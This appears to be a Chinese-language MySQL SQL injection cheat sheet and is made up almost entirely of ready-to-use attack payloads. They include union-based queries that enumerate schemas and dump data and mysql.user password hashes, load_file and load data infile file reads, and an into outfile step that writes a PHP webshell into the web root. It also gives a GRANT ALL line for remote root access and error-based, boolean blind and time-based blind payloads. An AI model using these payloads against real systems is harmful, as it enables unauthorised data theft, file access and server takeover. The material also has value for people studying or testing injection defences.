**0x00 mysql一般注入(select)**

1. 注释符
`#`  
`/*`
`—`

2. 过滤空格注入
使用/**/或()或+代替空格
%0c = form feed, new page  
%09 = horizontal tab  
%0d = carriage return  
%0a = line feed, new line

3. 多条数据显示
concat()  
group_concat()  
concat_ws()

4. 相关函数
system_user() 系统用户名  
user() 用户名  
current_user 当前用户名  
session_user()连接数据库的用户名  
database() 数据库名  
version() MYSQL数据库版本  
load_file() MYSQL读取本地文件的函数  
@@datadir 读取数据库路径  
@@basedir MYSQL 安装路径  
@@version_compile_os 操作系统 Windows Server 2003

GRANT ALL PRIVILEGES ON *.* TO ‘root’@’%’ IDENTIFIED BY ‘123456’ WITH GRANT OPTION;

5. mysql一般注入语句
猜字段数
order by n/*  
查看mysql基本信息  
and 1=2 union select 1,2,3,concat_ws(char(32,58,32),0x7c,user(),database(),version()),5,6,7/*  
查询数据库  
and 1=2 union select 1,schema_name,3,4 from information_schema.schemata limit 1,1/*  
and 1=2 union select 1,group_concat(schema_name),3,4 from information_schema.schemata/*  
查询表名  
and 1=2 union select 1,2,3,4,table_name,5 from information_schema.tables where table_schema=数据库的16进制编码 limit 1,1/*  
and 1=2 union select 1,2,3,4,group_concat(table_name),5 from information_schema.tables where table_schema=数据库的16进制编码/*  
查询字段  
and 1=2 union select 1,2,3,4,column_name,5,6,7 from information_schema.columns where table_name=表名的十六进制编码 and table_schema=数据库的16进制编码 limit 1,1/*  
and 1=2 union select 1,2,3,4,group_concat(column_name),5,6,7 from information_schema.columns where table_name=表名的十六进制编码 and table_schema=数据库的16进制编码/*  
查询数据  
and 1=2 union select 1,2,3,字段1,5,字段2,7,8 from 数据库.表/*
判断是否具有读写权限  
and (select count(*) from mysql.user)>0/*  
and (select count(file_priv) from mysql.user)>0/*

6. mysql读取写入文件
必备条件：
读：file权限必备
写：1.绝对路径 2.union使用 3. 可以使用”
————————-读———————-
mysql3.x读取方法  
create table a(cmd text);  
load data infile ‘c:\\xxx\\xxx\\xxx.txt’ into table a;  
select * from a;
mysql4.x读取方法  
除上述方法还可以使用load_file()  
create table a(cmd text);  
insert into a(cmd) values(load_file(‘c:\\ddd\\ddd\\ddd.txt’));  
select * from a;
mysql5.x读取方法  
上述两种都可以
读取文件技巧：  
load_file(char(32,26,56,66))  
load_file(0x633A5C626F6F742E696E69)
————写————————–
into outfile写文件
union select 1,2,3,char(这里写入你转换成10进制或16进制的一句话木马代码),5,6,7,8,9,10,7 into outfile ‘d:\web\90team.php’/*  
union select 1,2,3,load_file(‘d:\web\logo123.jpg’),5,6,7,8,9,10,7 into outfile ‘d:\web\90team.php’/*

**0x01 mysql一般注入(insert、update)**

mysql一般请求mysql_query不支持多语句执行，mysqli可以。

insert注入多使用报错注入!

1.如果可以直接插入管理员可以直接使用!

insert into user(username,password) values(‘xxxx’,’ xxxx’),(‘dddd’,’dddd’)/* ‘);

2.如果可以插入一些数据，这些数据会在网页中显示，我们可以结合xxs和csrf来获取cookies或getshell

update注入同上

**0x02 mysql报错注入**

1. and(select 1 from(select count(*),concat((select (select (语句)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and 1=1

语句处填入一般一句，如：SELECT distinct concat(0x7e,0x27,schema_name,0x27,0x7e) FROM information_schema.schemata LIMIT 0,1

2. and+1=(select+*+from+(select+NAME_CONST((语句),1),NAME_CONST((语句),1))+as+x)–

3.update web_ids set host=’www.0x50sec.org’ where id =1 aNd (SELECT 1 FROM (select count(*),concat(floor(rand(0)*2),(substring((Select (语句)),1,62)))a from information_schema.tables group by a)b);

4.insert into web_ids(host) values((select (1) from mysql.user where 1=1 aNd (SELECT 1 FROM (select count(*),concat(floor(rand(0)*2),(substring((Select (语句)),1,62)))a from information_schema.tables group by a)b)));  
**  
0x03 mysql一般盲注**

使用ascii

AND ascii(substring((SELECT password FROM users where id=1),1,1))=49

使用正则表达式

and 1=(SELECT 1 FROM information_schema.tables WHERE TABLE_SCHEMA=”blind_sqli” AND table_name REGEXP ‘^[a-n]’ LIMIT 0,1)

**0x04 mysql时间盲注**

1170 union select if(substring(current,1,1)=char(11),benchmark(5000000,encode(‘msg’,’by 5 seconds’)),null) from (select database() as current) as tbl

UNION SELECT IF(SUBSTRING(Password,1,1)=’a’,BENCHMARK(100000,SHA1(1)),0) User,Password FROM mysql.user WHERE User = ‘root’
<!--stackedit_data:
eyJoaXN0b3J5IjpbLTMyNjU2MDAwNl19
-->